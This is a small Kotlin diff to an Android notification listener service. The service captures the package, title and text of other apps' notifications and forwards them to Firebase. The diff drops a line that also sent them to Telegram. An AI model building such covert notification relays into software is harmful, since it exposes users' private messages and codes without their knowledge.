@@ -36,9 +36,8 @@ class TelegramNotificationListener : NotificationListenerService() {
         if (lastSentText[key] == combined) return
         lastSentText[key] = combined
 
-        val device = DevicePrefs.getDeviceName(applicationContext)
-        FirebaseHelper.pushTelegram(key, title, text, System.currentTimeMillis(), device)
-        TelegramHelper.send("📨 $pkg ($device)\n$title:\n$text")
+                val device = DevicePrefs.getDeviceName(applicationContext)
+        FirebaseHelper.pushTelegram(key, "$pkg | $title", text, System.currentTimeMillis(), device)
     }
 
     override fun onNotificationRemoved(sbn: StatusBarNotification) {
